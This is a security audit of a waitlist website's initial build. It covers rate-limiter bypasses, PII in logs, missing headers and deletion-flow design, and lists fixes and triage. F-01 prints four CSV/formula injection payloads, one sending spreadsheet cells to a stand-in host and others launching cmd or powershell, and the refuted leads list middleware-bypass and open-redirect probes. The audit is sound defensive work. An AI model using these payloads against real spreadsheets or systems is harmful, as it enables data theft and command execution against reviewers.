# Security audit 01

**Target:** `feat/initial-build` at `15ec005` · **Date:** 23 August 2026
**Scope:** Build Amendment 05 §3.1–3.7, stress testing §4
**Method:** static review plus live testing against a production build (`next build` + `next start`) on `localhost:3100`. No traffic was sent to any host other than localhost.

> **The audit itself changed no code.** Several findings were decisions rather than defects, and fixing during the audit would have destroyed the record and pre-empted choices that belonged to the founders.
>
> **Triaged and actioned in Build Amendments 06 and 07.** Every finding below now carries a `Triage:` line with its state and commit. **The finding text is unchanged** — a fixed vulnerability that leaves no record is one nobody knows was ever there.
>
> **16 fixed · 2 mitigated by decision · 1 accepted as-is · 0 outstanding without a decision.**

## Secret scan — clean

Run first, per §1. **No live secret found**, so the audit continued.

- 25 commits, 267 objects, every blob scanned for GitHub/AWS/Slack/OpenAI token shapes, PEM private keys, and `key|secret|token|password = "…"` assignments — no matches.
- The only env file ever committed is `.env.example`, containing three variable names with empty or localhost values.
- Nothing matching an ignore pattern is tracked.
- Repository confirmed **private** (`"private": true`; anonymous clone denied).

---

## Summary

19 findings, 8 refuted leads. Severity is rated twice because this codebase's worst defects are inert now and arm themselves at launch.

| # | Finding | Now | At launch | Surface | Triage |
|---|---|---|---|---|---|
| F-01 | CSV/formula injection into the review destination | Info | **Critical** | 3.5 | Fixed `1a2e1cb` |
| F-02 | Deletion flow has no server-side design to be wired into | Low | **Critical** | 3.3 | Mitigated `76cac82` |
| F-03 | `Preview the blocked state` demo button still present | Info | **Critical** | 3.3 | Fixed `78ba457` |
| F-04 | `X-Forwarded-For` rotation defeats the rate limiter | Low | **High** | 3.2 | Fixed `9e73002` |
| F-05 | Rate limiter is per-isolate on Cloudflare | Info | **High** | 3.2 | Open by decision |
| F-06 | Waitlist PII written to server logs | Low | **High** | 3.5 | Fixed `6ba606d` |
| F-07 | Waitlist silently succeeds while delivering nothing | Medium | **High** | 3.1 | Fixed `6ba606d` |
| F-08 | No CI, no Cloudflare Access configuration | Medium | **High** | 3.7 | Fixed `15c5748` |
| F-09 | No maximum length on any input field | Low | Medium | 3.1 | Fixed `08fcb7b` |
| F-10 | No Content-Security-Policy | Low | Medium | 3.4 | Fixed `6215397` |
| F-11 | Limiter eviction is unreachable under the attack pattern | Info | Medium | 3.2 | Fixed `b6d3ffd` |
| F-12 | Rate-limited requests still cost a full page render | Info | Medium | 3.2 | Mitigated `eea82cf` |
| F-13 | Action is invocable with no `Origin` header | Info | Medium | 3.1 | Fixed `a775a2e` |
| F-14 | HSTS `preload` asserted before a domain exists | Info | Medium | 3.4 | Fixed `5275dc5` |
| F-15 | No `Permissions-Policy`, COOP or CORP | Info | Low | 3.4 | Fixed `f3e4691` |
| F-16 | Stale `.next` silently 404s routes | Low | Low | 3.6 | Fixed `15c5748` |
| F-17 | Dependencies behind current patch releases | Low | Low | 3.6 | Fixed `9e4ed2b` |
| F-18 | Dot-segment URLs serve duplicate content | Info | Low | 3.4 | Accepted as-is |
| F-19 | `consent` satisfiable by a file part | Info | Low | 3.1 | Fixed `2f31fd8` |

### Recommended fix order

Not severity order. Some fixes are one line, some unblock others, and two are release gates that cost nothing to honour.

1. **F-03** — delete the demo button. One line. It is a release gate and it will be forgotten.
2. **F-01** — escape the four leading characters wherever submissions are written. One function, before any real destination is wired. Doing it after the first cohort means re-cleaning the data.
3. **F-07** — fail loudly when no webhook is configured. One line, and it currently hides the failure of the site's only conversion.
4. **F-06** — stop logging the submission body. Same edit as F-07 touches.
5. **F-09** — add field length caps. Cheap, and it bounds F-06 and F-01 blast radius.
6. **F-08** — CI plus Cloudflare Access. Unblocks everything else being verified continuously.
7. **F-04, F-05, F-11, F-12** — replace the rate limiter with KV or a Durable Object. One change closes all four; doing them individually is wasted work.
8. **F-02** — design the deletion backend before writing it. Blocks the app-store submission path.
9. **F-10, F-14, F-15** — header decisions. Cheap, but they are choices, and F-10 is easier than expected (see the finding).
10. **F-13, F-16, F-17, F-18, F-19** — hygiene, any time.

### What the triage actually did differently

Recorded because the reasoning is better than mine was.

- **Item 7 was wrong.** This report recommended replacing the in-app limiter with
  KV or a Durable Object. The triage kept it and **demoted it**: the primary
  control becomes Cloudflare's edge rate-limiting rules, where a refused request
  never reaches a function at all. That closes F-12, which KV would not have —
  KV still runs the function. F-05 stays open by decision, correctly rescoped:
  a *backstop* being per-isolate is not the same problem as a *primary control*
  being per-isolate.
- **F-11 was therefore not moot.** This report grouped it under "moot if the
  limiter is replaced". Since the limiter is kept as a backstop, the one-line
  sweep fix stood on its own.
- **F-02 was resolved by removing the requirement, not by meeting it.** The
  specification asked for a working deletion flow; the triage ruled that the
  app-store obligation is that a person can find and understand the path, and
  flagged the interactive flow off. The design requirements moved to
  `docs/deletion-flow-design.md` and became the specification.
- **F-10 shipped `'unsafe-inline'` on `script-src` deliberately**, against a
  nonce, because 30 statically prerendered pages on a low-end-Android constraint
  beat defence-in-depth on a site with no injection sink. The revisit trigger is
  in `SECURITY.md`.

Founder tasks that no commit can close — the Cloudflare origin lock, Access,
edge rate-limiting rules, the waitlist destination, the log-sink assessment, and
the manual QA pass — are tracked in Build Amendment 07 §6.

---

## Findings

### F-01 — CSV/formula injection into the review destination

```
Severity now:       Informational
Severity at launch: Critical
Surface:            3.5
Status:             Confirmed
```

> **Triage: FIXED** · `1a2e1cb`
> Escaped at the delivery boundary; the stored value is unchanged.

**What it is.** No field is escaped anywhere between the form and the delivery destination. A field beginning `=`, `+`, `@` or `-` is a formula in Excel, Google Sheets and LibreOffice. The intended destination is a spreadsheet a founder reads by hand, so the attack lands on the person doing waitlist review — the one human control in the intake process.

The `=HYPERLINK` variant is the sharpest: it renders as ordinary link text, and clicking it exfiltrates adjacent cells — other applicants' names and phone numbers — to an attacker-controlled URL. The reviewer sees a link that looks like part of the tool they are using.

**Reproduction.** Submit with `fullName` set to the payload, then read what the destination receives. Verified end to end against a local webhook receiver on `:4555`.

**Evidence.** All four dangerous leading characters arrived verbatim:

```
fullName: "=HYPERLINK(\"https://evil.example/?x=\"&A1&A2,\"Click to verify\")"
fullName: "+cmd|' /C calc'!A1"
fullName: "@SUM(1+1)*cmd|' /C powershell'!A1"
fullName: "-2+3+cmd|' /C notepad'!A1"
```

`src/app/actions/waitlist.ts:74` builds the payload with no escaping. Every text field is affected — `fullName`, `handle`, `secondHandle`, `sells`, `city`, `followers`.

**One thing already mitigated:** `str()` in `src/lib/validation.ts:15` calls `.trim()`, so a leading tab or carriage return is stripped. The `\tTabLeading` payload arrived as `"TabLeading"`. Only the four printable characters get through.

**Fix options.**
- Prefix any value beginning `= + @ -` with a single quote at the point of delivery. Standard, and the spreadsheet strips it on display. Changes stored data.
- Prefix with a zero-width character. Invisible, but breaks exact-match search on the field.
- Deliver to something that is not a spreadsheet, and escape only at export.
- Escape on write **and** treat the existing sheet as untrusted until re-cleaned.

**Depends on.** The waitlist delivery destination decision (CEO). The escaping should exist before it is wired, not after.

---

### F-02 — The deletion flow has no server-side design to be wired into

```
Severity now:       Low
Severity at launch: Critical
Surface:            3.3
Status:             Confirmed
```

> **Triage: MITIGATED** · `76cac82`, `ef33831`
> Interactive flow gated off behind `DELETION_FLOW_ENABLED`; the seven design conditions moved to `docs/deletion-flow-design.md`. Becomes build work when the account backend exists.

**What it is.** `src/components/DeleteAccountFlow.tsx` holds the entire state machine — `explain → phone → otp → confirm → success`, plus `blocked` — in React state. There is no server action, no API route, and no server-side counterpart of any kind: a grep of `src/app/actions/` for OTP handling returns nothing.

This is harmless while mocked. It matters because the amendment is right that it is about to be wired, and the current shape cannot be wired safely — every transition is a client decision. A user reaches `confirm` without passing `otp` by construction.

The blocked branch is the sharpest part. It lists a seller's outstanding orders, unconfirmed payments and open claims. That is account data, and the only thing standing in front of it would be a six-digit code.

**Reproduction.** Not exploitable today; nothing is verified server-side because nothing is sent to a server. Load `/en/delete-account`, advance to the OTP step, enter any six digits — the client accepts it (`/^\d{6}$/` at line 134).

**Evidence.** `src/components/DeleteAccountFlow.tsx:30` (`useState<Step>('explain')`), `:134` (client-side code check), `:177–186` (blocked branch reachable by button). No server file exists.

**What the server-authoritative design must do.** Stated as requirements, not as a chosen design:

- The server owns the state. Each step presents a short-lived, single-use token bound to the previous step. Reaching `confirm` requires proof that `otp` was passed.
- **Uniform response for every phone number**, whether or not an account exists — same body, same status, and same timing. Send-code must not reveal existence.
- **OTP:** 6 digits is 10⁶. A hard attempt cap (5 or fewer) per code, code expiry (≤10 minutes), single-use, and invalidation of prior codes on reissue.
- **Rate limiting per phone *and* per IP.** Per-IP alone lets one attacker walk many numbers; per-phone alone lets a botnet grind one. Both, independently.
- Replay of a consumed code must fail closed.
- The blocked list is account data: return it only after the OTP is verified server-side, never in the same response as the code check.
- Constant-time comparison for the code.

**Fix options.** Design first, then build. This finding is a request to write the design down before implementation, not a code change.

**Depends on.** The real account backend, which does not exist yet.

---

### F-03 — `Preview the blocked state` demo button still present

```
Severity now:       Informational
Severity at launch: Critical
Surface:            3.3
Status:             Confirmed
```

> **Triage: FIXED** · `78ba457`
> Button and its state transition removed.

**What it is.** A visible button on the OTP step jumps straight to the blocked state, which displays account data. Harmless while that data is hardcoded; a direct bypass the moment it is real.

**Evidence.** `src/components/DeleteAccountFlow.tsx:180–186`, comment at `:177` says `DEMO AFFORDANCE -- REMOVE when the real obligation lookup is wired.` Already listed as a launch blocker in `README.md` and `SECURITY.md`.

**Fix options.** Delete it. If the blocked branch needs to stay reviewable, put it behind a build-time flag that is off in production, or a Storybook-style route excluded from the build.

**Depends on.** Nothing. This is one line and it is the cheapest item in the report.

---

### F-04 — `X-Forwarded-For` rotation defeats the rate limiter

```
Severity now:       Low
Severity at launch: High (conditional — see below)
Surface:            3.2
Status:             Confirmed
```

> **Triage: FIXED** · `9e73002`
> Fallback removed; only `cf-connecting-ip` is trusted, unidentified clients share one bucket. Re-measured 5 of 30, was 30 of 30. The origin-lock conditional is a founder task.

**What it is.** `clientKey()` reads `cf-connecting-ip`, then falls back to the first entry of `x-forwarded-for`. Both are client-supplied unless a trusted proxy overwrites them. Adding one header per request gives every request a fresh identity and the limit never applies.

**Reproduction.** 1,000-request runs against the waitlist action, counting entries that reached the handler.

**Evidence.**

| Scenario | Reached handler | Expected |
|---|---|---|
| Same identity, no headers | **5 of 12** | 5 |
| Rotating `X-Forwarded-For` | **30 of 30** | 5 |
| One fixed `X-Forwarded-For`, repeated | 5 of 12 | 5 |
| Fixed `CF-Connecting-IP`, rotating `X-Forwarded-For` | **5 of 20** | 5 |
| Rotating `CF-Connecting-IP` | 20 of 20 | n/a |

`src/lib/rate-limit.ts:52–57`.

**The conditional.** Row 4 is the important one: `cf-connecting-ip` is checked **first**, and Cloudflare sets it at the edge and strips client-supplied copies. So behind Cloudflare this specific bypass is closed — **provided the origin is not reachable except through Cloudflare.** If the Pages project is ever bypassable, or the app runs anywhere else, the fallback is wide open. The severity above assumes that origin lock is not yet proven (see F-08).

Row 5 is not a bypass — it is what a genuine distributed source looks like, and it is the reason per-IP limiting alone will not protect the cohort intake.

**Fix options.**
- Trust only `cf-connecting-ip` and reject the `x-forwarded-for` fallback outright; fail closed when neither is present.
- Keep the fallback but only when the connection comes from a known Cloudflare range.
- Move to an identity that is not network-derived (a signed cookie or proof-of-work) for the abuse-control layer.

**Depends on.** Confirming the Cloudflare origin lock (F-08).

---

### F-05 — The rate limiter is per-isolate on Cloudflare

```
Severity now:       Informational
Severity at launch: High
Surface:            3.2
Status:             Suspected — not testable in this environment
```

> **Triage: OPEN — by decision** · `eea82cf`
> The limiter is demoted to a fail-closed backstop; the primary control becomes Cloudflare edge rules. A backstop being per-isolate is acceptable in a way a primary control is not. Still not testable without a deployment.

**What it is.** The limiter is a module-level `Map` in process memory. Cloudflare Workers run many short-lived isolates across many locations; there is no shared memory. The effective limit becomes *5 × number of live isolates*, and an isolate that is recycled starts at zero.

**Reproduction.** Not testable locally — it requires a real Cloudflare deployment, which §1 forbids. Locally there is one process, so the limiter behaves correctly (5 of 12 above).

The steps for someone with a deployment: send more than 5 submissions from one IP through the deployed site, spread over a few minutes, and count how many are delivered. Any number above 5 measures the isolate spread.

**Evidence.** `src/lib/rate-limit.ts:14` — `const windows = new Map<string, Window>();` at module scope. The file's own header comment already states this. Restart resets it entirely: every server restart during testing returned the limiter to zero, which is the same behaviour an isolate recycle produces.

**Fix options.** Cloudflare KV (eventually consistent — some overshoot), a Durable Object (strongly consistent, one object per key, costs a round trip), or Cloudflare's own rate-limiting rules at the edge, which never reach the application at all.

**Depends on.** Nothing technically; it is already a known replacement.

---

### F-06 — Waitlist PII written to server logs

```
Severity now:       Low
Severity at launch: High
Surface:            3.5
Status:             Confirmed
```

> **Triage: FIXED** · `6ba606d`
> The `console.info` that wrote name, phone, handle and city is gone. Verified zero submission content in any log across three run modes.

**What it is.** With no `WAITLIST_WEBHOOK_URL` configured, `console.info` writes the entire submission to stdout. That is name, phone number, social handle and city — personal data under Proclamation 1321/2024 — landing in whatever log sink the runtime has, with retention and access controls nobody has assessed and which almost certainly do not match the 12-month commitment published on the site.

**Reproduction.** Submit with no webhook set; read the server log.

**Evidence.** Verbatim from a production run:

```
[waitlist] no WAITLIST_WEBHOOK_URL set; submission not delivered {
  reference: 'ADL-WL-26-9784',
  fullName: 'NoJS Tester',
  phone: '+251911223344',
  platform: 'tiktok',
  handle: '@nojs',
  ...
  city: 'Addis',
  submittedAt: '2026-08-23T12:23:36.652Z'
}
```

`src/app/actions/waitlist.ts:89`. Measured volume: **326 bytes of log per submission**; 20,000 submissions produced 6.5 MB across 260,006 lines.

The 12-month retention statement is in three places (`waitlist.fields.consent`, and Privacy §2 and §9 when written). A log sink retaining beyond that, or accessible to people outside the review process, contradicts it.

**Fix options.**
- Log the reference and a field count only; never the body.
- Log the body only behind an explicit debug flag that is off by default.
- Refuse to start, or refuse to accept submissions, when no destination is configured (this also fixes F-07).

**Depends on.** Overlaps F-07 — the same few lines. The DPIA (ADU-PROJ-01 §14) should cover the log sink as well as the destination.

---

### F-07 — The waitlist silently succeeds while delivering nothing

```
Severity now:       Medium
Severity at launch: High
Surface:            3.1
Status:             Confirmed
```

> **Triage: FIXED** · `6ba606d`
> A reference is issued only after delivery succeeds; `npm run build` refuses without a destination.

**What it is.** With no webhook configured the action logs, then returns `{ok: true, reference}`. The applicant sees "You are on the waitlist" and a reference number. Nobody receives the application unless somebody is reading server logs.

This is the site's only conversion, and the failure mode is invisible from both ends: the seller believes they applied, and the founders see no queue rather than an error.

**Reproduction.** Start with `WAITLIST_WEBHOOK_URL` unset, submit a valid application, observe the success screen and reference number, observe that nothing is delivered.

**Evidence.** `src/app/actions/waitlist.ts:86–90`. Confirmed live: 20,000 submissions during load testing all returned success and produced only log lines.

Related, and better behaved: when a webhook **is** configured and fails, the action returns `unexpected` and the user is told "Your details were not saved — try again." That path is correct. It is only the *unconfigured* path that lies.

**Fix options.**
- Treat a missing destination as an error: return `unexpected` rather than success.
- Fail the build or refuse to boot without the variable set.
- Keep the current behaviour only under an explicit `ALLOW_UNDELIVERED=1` development flag.

**Depends on.** The waitlist delivery destination decision (CEO).

---

### F-08 — No CI, and no Cloudflare Access configuration

```
Severity now:       Medium
Severity at launch: High
Surface:            3.7
Status:             Confirmed
```

> **Triage: FIXED** · `15c5748`
> GitHub Actions on every PR, including the copy invariants and a route smoke check. Cloudflare Access remains a founder task.

**What it is.** There is no `.github/` directory, no workflow, and no `wrangler.toml`, `_headers`, `_redirects` or any other Cloudflare configuration in the repository. Cloudflare Access is a stated intention with nothing in the repo to enforce it, and there is no automated check that any of the invariants in this codebase still hold on a given commit.

This matters for the audit itself: every result here is a point-in-time measurement of one commit on one machine. Nothing re-checks them.

It also gates F-04: whether the `x-forwarded-for` fallback is exploitable in production depends entirely on whether the origin is reachable without going through Cloudflare, and there is nothing in the repo that establishes that either way.

**Evidence.** `find .github -type f` → no such directory. No Cloudflare config files present. `README.md` lists CI and the Cloudflare deployment as outstanding.

**Fix options.**
- CI running `npm ci && npm run check:i18n && npm run typecheck && npm run lint && npm run build` on every PR — the commands already exist.
- Add the copy-regression greps from Part 9 as a CI step, so the invariants are machine-checked rather than reviewer-checked.
- Configure Cloudflare Access before any preview deployment, and lock the origin to Cloudflare so F-04's fallback is unreachable.

**Depends on.** A Cloudflare account decision.

---

### F-09 — No maximum length on any input field

```
Severity now:       Low
Severity at launch: Medium
Surface:            3.1
Status:             Confirmed
```

> **Triage: FIXED** · `08fcb7b`
> Per-field caps, plus `bodySizeLimit` lowered from 1 MB to 64kb.

**What it is.** No field has a length limit. The only bound is Next's default server action body cap of 1 MB, which is a framework default nobody chose and which applies to the whole request rather than to any field.

**Reproduction.** Submit progressively longer `fullName` values.

**Evidence.**

| `fullName` length | Result |
|---|---|
| 10,000 | accepted, delivered |
| 500,000 | accepted, delivered |
| 900,000 | accepted, delivered |
| 1,048,576 | HTTP 500, rejected |
| 2,000,000 | HTTP 500, rejected |

A ~900 KB name is validated, logged and delivered. `src/app/actions/waitlist.ts:47–70` checks presence, never length.

**Fix options.**
- Per-field caps in the action (names ~100, handles ~64, free text ~500), returning the existing error-summary mechanism.
- Lower `serverActions.bodySizeLimit` in `next.config.mjs` — bounds the request but gives no per-field error.
- Both: the config as a backstop, per-field limits for the message the person actually sees.

**Depends on.** Nothing. Note the limits become user-facing copy, so they need Amharic strings.

---

### F-10 — No Content-Security-Policy

```
Severity now:       Low
Severity at launch: Medium
Surface:            3.4
Status:             Confirmed
```

> **Triage: FIXED** · `6215397`
> Strict policy with `'unsafe-inline'` on `script-src` only. Revisit trigger recorded in `SECURITY.md`.

**What it is.** `next.config.mjs` sets four headers and no CSP. There is no injection sink in the current code — no `dangerouslySetInnerHTML`, no `eval`, no `innerHTML`, no third-party script — so there is nothing to exploit today. CSP is defence in depth for the code not yet written: Tier 2 adds four legal pages and two more forms.

**Evidence.** Headers on `/en` in production: `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`, `Strict-Transport-Security`. Absent: `Content-Security-Policy`, `Permissions-Policy`, COOP, CORP, COEP.

**What a policy would have to permit — measured, not assumed.** This is easier than the amendment expected:

| Directive | What the site actually needs |
|---|---|
| `script-src` | `'self'` only. **All scripts are same-origin `/_next/*`.** But there are **17 inline `<script>` blocks** per page — Next's RSC bootstrap — so this needs a nonce or hashes, or `'unsafe-inline'` which would defeat the point. |
| `style-src` | `'self'`. Zero inline `style=` attributes and zero `<style>` blocks were found in the rendered output. |
| `font-src` | **`'self'` only.** `next/font/google` downloads at build time — 10 `.woff2` files are emitted to `/_next/static/media` and there is **no runtime reference to `fonts.googleapis.com` or `fonts.gstatic.com` anywhere in the build.** No Google origin is needed. |
| `img-src` | `'self' data:`. Zero `<img>` tags; images are CSS-drawn placeholders. |
| `connect-src` | `'self'`. The only `fetch()` in the codebase is server-side, to the webhook. |
| `frame-ancestors` | `'none'`, matching the existing `X-Frame-Options: DENY`. |
| `base-uri`, `form-action` | `'none'` and `'self'`. |

So a strict policy is within reach and the only real work is the inline-script nonce. That requires generating a nonce per request in middleware and threading it into the script tags, which on a fully-prerendered site conflicts with static caching — the honest trade-off is: nonces force dynamic rendering, hashes are brittle across builds, `'unsafe-inline'` is cheap and nearly worthless for `script-src`.

**Fix options.**
- Nonce-based `script-src` via middleware, accepting that pages stop being statically cached.
- `'unsafe-inline'` for `script-src` but strict everything else — weak against XSS, still useful against exfiltration via `connect-src` and `form-action`.
- Report-only mode first (`Content-Security-Policy-Report-Only`) to measure real violations before enforcing. Needs a self-hosted report endpoint, since third-party collectors are prohibited.

**Depends on.** A decision on whether static caching or a strict `script-src` matters more. That is a founder call.

---

### F-11 — Limiter eviction is unreachable under the attack pattern

```
Severity now:       Informational
Severity at launch: Medium
Surface:            3.2
Status:             Confirmed
```

> **Triage: FIXED** · `b6d3ffd`
> Sweep moved above the early return. 15.47 MB → 9.46 MB on the same flood, with live keys still retained.

**What it is.** The `Map` sweep that deletes expired entries sits *below* the early return. A brand-new key takes the early-return branch and never reaches the sweep. So the one traffic pattern that grows the map fastest — a flood of unique keys — is exactly the pattern that never cleans it up. Only repeat traffic on a live key triggers eviction.

**Reproduction.** Unit-test the module directly with `node --experimental-strip-types`.

**Evidence.** Isolated from Next, so the numbers are the limiter's own:

```
200,000 unique keys           -> 279 bytes per entry (~53 MB retained)
seed 50,000 keys, all expired -> 15.47 MB
+200 further NEW keys         -> 15.80 MB   (sweep not reached, nothing freed)
+1 repeat hit on a live key   ->  8.96 MB   (sweep ran, 6.51 MB freed)
```

`src/lib/rate-limit.ts:26–30` returns before `:35`, where the sweep lives.

At 279 bytes per entry: 1M keys ≈ 266 MB, which exceeds a Cloudflare Worker's 128 MB limit well before that. In-process on a Node host the growth is real but slow.

**Fix options.** Moot if the limiter is replaced (F-05) — which is why these are grouped in the fix order. If it is kept: move the sweep above the early return, or use a periodic timer, or a bounded LRU.

**Depends on.** F-05 — replacing the limiter closes this without a separate fix.

---

### F-12 — Rate-limited requests still cost a full page render

```
Severity now:       Informational
Severity at launch: Medium
Surface:            3.2
Status:             Confirmed
```

> **Triage: MITIGATED** · `eea82cf`
> Closed by moving the primary control to Cloudflare edge rules, where a refused request never reaches a function. Configuration is a founder task.

**What it is.** A refused submission still returns HTTP 200 with the whole page re-rendered — roughly 33 KB. The limiter prevents the submission being *recorded*; it does nothing for load. An attacker who is being rate-limited still costs the same as one who is not.

**Evidence.** Measured on the production build, `localhost`, 50 concurrent:

| Scenario | Throughput | p50 | p90 | p99 | Recorded |
|---|---|---|---|---|---|
| Static prerendered page (100 conc) | **450 req/s** | 212 ms | 246 ms | 374 ms | n/a |
| Waitlist action, all rate-limited | **66 req/s** | 737 ms | 838 ms | 1222 ms | 5 of 1000 |
| Waitlist action, unique key each | **73 req/s** | 681 ms | 732 ms | 760 ms | **1000 of 1000** |

The middle and bottom rows cost almost the same. Static pages are ~6× cheaper, and confirm prerendered routes are served without meaningful per-request work.

The bottom row is the one to note: **1,000 accepted submissions in 13.7 seconds** from one machine.

**Fix options.** Reject at the edge (Cloudflare rate-limiting rules) so refused requests never reach a function; return a small response rather than a full render when refused; add proof-of-work or a challenge for repeat offenders.

**Depends on.** F-05.

---

### F-13 — The action is invocable with no `Origin` header

```
Severity now:       Informational
Severity at launch: Medium
Surface:            3.1
Status:             Confirmed
```

> **Triage: FIXED** · `a775a2e`
> Requests with no `Origin` are refused. ⚠ Gated on a no-JS check in `docs/manual-qa.md` §4; revert if Safari or Chrome fails it.

**What it is.** Next rejects a server action when `Origin` disagrees with `Host`, but accepts a request with **no** `Origin` at all. Browsers always send `Origin` on a cross-origin POST, so this is not browser-exploitable CSRF. It does mean any non-browser client can invoke the action directly with no token — which is the spam path, not the CSRF path.

**Evidence.**

| Request | Result | Action ran |
|---|---|---|
| `Origin: http://localhost:3100` | 200 | yes |
| `Origin: https://evil.example.com` | **500, rejected** | no |
| No `Origin` header | 200 | **yes** |
| `Origin` valid + forged `X-Forwarded-Host` | **500, rejected** | no |

The rejections logged `Error: Invalid Server Actions request.` — and the origin check proved itself twice more by accident: my load generator initially sent `Host: 127.0.0.1` with `Origin: localhost` and was rejected 40,000 times.

**Fix options.** Accept it — the CSRF property that matters holds. Or require `Origin` explicitly and reject its absence, which costs nothing since every real browser sends it. Or add a form token, which duplicates what the origin check already provides.

**Depends on.** Nothing. Largely a hardening preference; the real abuse control is rate limiting.

---

### F-14 — HSTS `preload` asserted before a domain exists

```
Severity now:       Informational
Severity at launch: Medium
Surface:            3.4
Status:             Confirmed
```

> **Triage: FIXED** · `5275dc5`
> `preload` removed; re-adding it is a launch checklist item in `README.md`.

**What it is.** `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` is being sent by a site with no domain. `preload` is a request to be baked into browsers' built-in HSTS list. Removal takes months and cannot be rushed, and `includeSubDomains` binds every future subdomain to HTTPS — including any that a partner, a staging host or a mail vendor might later need.

Two years of `max-age` on a domain whose DNS is not yet decided is a commitment made before the thing it commits.

**Evidence.** `next.config.mjs:20–22`; header confirmed present on every response.

**Fix options.**
- Keep `max-age` and `includeSubDomains`, drop `preload` until the domain and its subdomain plan are settled; add it at launch.
- Ship a short `max-age` (hours) pre-launch and raise it once stable — the standard ramp.
- Keep as-is, accepting that the domain is committed to HTTPS-only on every subdomain from first publication.

**Depends on.** The domain decision (CEO).

---

### F-15 — No `Permissions-Policy`, COOP or CORP

```
Severity now:       Informational
Severity at launch: Low
Surface:            3.4
Status:             Confirmed
```

> **Triage: FIXED** · `f3e4691`
> `Permissions-Policy`, COOP and CORP added.

**What it is.** No `Permissions-Policy`, so the page does not deny browser features it never uses. No `Cross-Origin-Opener-Policy` or `Cross-Origin-Resource-Policy`. Low impact on a site with no third-party frames, no camera use and no cross-origin embedding — but they are free.

**Fix options.** A deny-by-default set matching what the site actually uses (nothing):

```
Permissions-Policy: accelerometer=(), autoplay=(), camera=(), display-capture=(),
  encrypted-media=(), fullscreen=(), geolocation=(), gyroscope=(), magnetometer=(),
  microphone=(), midi=(), payment=(), picture-in-picture=(), usb=(), xr-spatial-tracking=()
Cross-Origin-Opener-Policy: same-origin
Cross-Origin-Resource-Policy: same-origin
```

Note the buyer app will eventually want camera for QR scanning — that is the app, not this site, so `camera=()` here is safe.

**Depends on.** Nothing.

---

### F-16 — A stale `.next` silently 404s routes

```
Severity now:       Low
Severity at launch: Low
Surface:            3.6
Status:             Confirmed
```

> **Triage: FIXED** · `15c5748`
> CI builds from a clean `.next` and never caches it; the route smoke check would have caught the original symptom.

**What it is.** Found by accident during this audit. After `npm ci` replaced `node_modules` and a build ran over an existing `.next`, exactly two routes — `/en/about` and `/am` — returned 404 in production while their prerendered HTML existed on disk. `rm -rf .next` and a clean rebuild restored all 30. Deterministic across repeated requests and server restarts, so not a caching artefact.

I could not determine the mechanism, and it may be a Next bug rather than anything in this codebase. It is recorded because a build that silently serves 404s for real pages is the kind of thing that reaches production through a cached CI directory.

**Evidence.** 28 of 30 routes 200 with the stale directory; 30 of 30 after `rm -rf .next`. Both failing routes had valid HTML on disk (`am.html` 10,401 bytes, `en/about.html` 9,441 bytes).

**Fix options.** Build from a clean `.next` in CI; do not cache `.next` across dependency changes; add a post-build smoke check that every route in `ROUTES` × locales returns 200 — cheap, and it would have caught this.

**Depends on.** F-08 (CI).

---

### F-17 — Dependencies behind current patch releases

```
Severity now:       Low
Severity at launch: Low
Surface:            3.6
Status:             Confirmed
```

> **Triage: FIXED** · `9e4ed2b`
> Same-major patch bumps. The three high advisories are unchanged and still accepted.

**What it is.** `npm audit` reports **3 high**, all as documented in `SECURITY.md` and all still accurately assessed — `postcss` and `sharp` nested inside Next 15, fixable only by Next 16. I re-verified both non-exploitability claims: no CSS from outside the repo is ever compiled, and there is no `next/image` usage and no raster asset anywhere in the project.

**`next-intl` v4.13.7 is clean** — it no longer appears in `npm audit` at all, so the v3 open redirect that motivated the migration is resolved.

Separately, several dependencies sit behind current patch releases within their pinned majors, most notably **`react` and `react-dom` at 19.0.0 against 19.2.8**. No advisory applies today; it is hygiene, and React patches have carried security fixes before.

**Evidence.** `npm audit`: `{"high":3,"critical":0,"moderate":0,"low":0}`. `npm outdated`: 11 packages behind, of which `react`, `react-dom`, `@types/*` and `autoprefixer` are same-major.

`package-lock.json` is committed, `lockfileVersion: 3`, 459 packages, and `npm ci` is reproducible — the lockfile was byte-identical afterwards. Dependency surface: 96 production, 362 dev-only.

**Fix options.** Bump same-major patches routinely; keep Next 16 as its own deliberate piece of work per `SECURITY.md`.

**Depends on.** Nothing.

---

### F-18 — Dot-segment URLs serve duplicate content

```
Severity now:       Informational
Severity at launch: Low
Surface:            3.4
Status:             Confirmed
```

> **Triage: ACCEPTED — no change** · —
> Canonical work from Amendment 04 already mitigates the SEO consequence. Revisit only if these appear in real traffic logs.

**What it is.** `/en/./about` and `/en/%2e/about` both serve the About page with HTTP 200 rather than redirecting. Duplicate URLs for the same content.

**Evidence.** Both return the About page. Both correctly emit `canonical: /en/about`, which is what keeps this Informational — the canonical work from Amendment 04 already mitigates the SEO consequence. `/en/about/` correctly 308-redirects, and `/en//about` 308-redirects.

**Fix options.** Normalise dot segments to a 308 redirect at the edge, or accept it given the canonical is correct.

**Depends on.** Nothing.

---

### F-19 — `consent` is satisfiable by a file part

```
Severity now:       Informational
Severity at launch: Low
Surface:            3.1
Status:             Confirmed
```

> **Triage: FIXED** · `2f31fd8`
> Consent requires the literal checkbox value and is recorded as a timestamped boolean.

**What it is.** `checked()` tests only `data.get(key) != null`, so any present entry satisfies consent — including a file upload or an arbitrary string, not just a checkbox value.

**Evidence.** A submission with `consent` sent as a file part was accepted and delivered (`fullName="CFILE"` reached the webhook). `src/lib/validation.ts:20`.

Consent is a legal record under Proclamation 1321/2024, so what counts as having given it is worth being exact about. The counterpart is sound: `str()` returns `''` for any non-string, so a file in a *text* field fails validation rather than being coerced.

**Fix options.** Require the literal value the checkbox submits (`'on'`), or require `typeof value === 'string'`. Record consent as an explicit timestamped boolean at the destination rather than inferring it from field presence.

**Depends on.** Nothing.

---

## Refuted leads

Each was tested, and each is a useful result.

| # | Lead | Verdict |
|---|---|---|
| R-01 | **CVE-2025-29927 middleware bypass** | **Refuted.** Patched at 15.5.23. Five payload variants of `x-middleware-subrequest` (`middleware`, `src/middleware`, `pages/_middleware`, and 5-deep colon-repeated forms) all produced the identical 307 to `/en` as a request with no header. `x-middleware-rewrite`, `x-middleware-next`, `x-nextjs-data` and `x-invoke-path` likewise changed nothing. |
| R-02 | **Open redirect via path manipulation** | **Refuted.** Every `Location` header is a single-slash, same-origin relative path. `//evil.example.com` → `/evil.example.com`; `/\evil.example.com` → `/evil.example.com`; `///en` → `/en`. Checked the raw header, not curl's resolved URL — the distinction matters, since a protocol-relative `//host` would be a real redirect. None was found. |
